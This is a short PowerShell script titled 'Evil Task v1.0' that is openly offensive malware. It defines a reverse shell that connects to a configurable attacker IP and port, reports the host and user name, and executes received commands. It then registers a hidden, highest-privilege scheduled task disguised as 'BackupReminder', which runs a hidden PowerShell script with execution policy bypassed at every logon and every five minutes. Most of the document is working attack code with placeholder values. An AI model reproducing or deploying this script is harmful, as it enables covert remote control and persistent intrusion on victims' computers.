#Evil Task v1.0

$dyndns = yourdns
$ip = yourip
$port = yourport

$revshell = $a=new-object net.sockets.tcpclient("$ip",$port);while($true){$b=$a.getstream();$c=new-object system.io.streamreader($b);$d=new-object system.io.streamwriter($b);$n1=$env:computername;$n2=$env:username;$d.write("PS] "+$n1+" | "+$n2+"`n"+(pwd).path+"> ");$d.flush();$e=$c.readline();$f=iex $e 2>&1;$d.writeline($f);$d.flush()}

# Define the action to execute
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Path\To\YourScript.ps1"'

# Create the logon trigger
$tLogon = New-ScheduledTaskTrigger -AtLogOn

# Create the time trigger for every 5 minutes
$tTime = New-ScheduledTaskTrigger -Daily -At "00:00AM"
$tTime.Repetition.Interval = (New-TimeSpan -Minutes 5)
$tTime.Repetition.Duration = (New-TimeSpan -Days 1)

# Define the settings for the scheduled task
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden

# Register the scheduled task with both triggers
Register-ScheduledTask -Action $taskAction -TaskName 'BackupReminder' -RunLevel Highest -Trigger $tLogon, $tTime -Settings $settings
